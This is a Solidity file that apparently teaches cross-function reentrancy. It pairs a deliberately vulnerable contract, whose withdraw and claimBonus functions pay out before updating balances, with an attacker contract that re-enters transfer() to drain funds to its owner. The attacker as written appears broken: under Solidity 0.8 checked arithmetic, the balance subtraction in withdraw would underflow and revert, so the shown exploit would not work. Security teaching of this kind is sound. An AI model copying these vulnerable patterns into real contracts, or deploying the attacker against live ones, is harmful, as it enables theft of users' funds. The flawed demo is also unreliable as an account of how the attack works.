// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Demonstrates cross-function reentrancy vulnerabilities
 */
contract CrossFunctionReentrancy {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public bonuses;
    
    uint256 public totalSupply;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event BonusClaimed(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalSupply += msg.value;
        
        bonuses[msg.sender] += msg.value / 10;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * VULNERABLE: An attacker can re-enter through transfer() during this call
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State updated after call
        balances[msg.sender] -= amount;
        totalSupply -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }

    /**
     * VULNERABLE: Can be called during withdraw's external call to manipulate balances
     */
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    /**
     * VULNERABLE: Claim bonus shares state with withdraw
     */
    function claimBonus() external {
        uint256 bonus = bonuses[msg.sender];
        require(bonus > 0, "No bonus");
        
        (bool success, ) = msg.sender.call{value: bonus}("");
        require(success, "Transfer failed");
        
        bonuses[msg.sender] = 0;
        
        emit BonusClaimed(msg.sender, bonus);
    }

    function getTotalValue(address user) external view returns (uint256) {
        return balances[user] + bonuses[user];
    }

    receive() external payable {}
}

/**
 * Example attacker contract for cross-function reentrancy
 */
contract CrossFunctionAttacker {
    CrossFunctionReentrancy public target;
    address public owner;
    uint256 public attackCount;

    constructor(address _target) {
        target = CrossFunctionReentrancy(payable(_target));
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 3 && target.balances(address(this)) > 0) {
            target.transfer(owner, target.balances(address(this)));
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
